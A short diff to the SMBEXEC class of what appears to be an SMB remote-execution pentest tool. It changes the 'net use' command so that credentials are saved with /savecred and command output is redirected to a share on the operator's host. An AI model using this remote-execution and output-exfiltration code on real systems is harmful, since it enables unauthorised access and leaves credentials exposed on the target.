@@ -135,7 +135,7 @@ class SMBEXEC:
 
         if self.__retOutput:
             #adding creds gets past systems disallowing guest-auth
-            command = self.__shell + '"net use /persistent:no \\\\{}\\{} /user:{} {}" \n'.format(local_ip, self.__share_name, self.__username, self.__password) 
+            command = self.__shell + '"net use \\\\{}\\{} /savecred /user:{} {}" \n'.format(local_ip, self.__share_name, self.__username, self.__password) 
             command += self.__shell + data + ' ^> \\\\{}\\{}\\{}'.format(local_ip, self.__share_name, self.__output)
         else:
             command = self.__shell + data
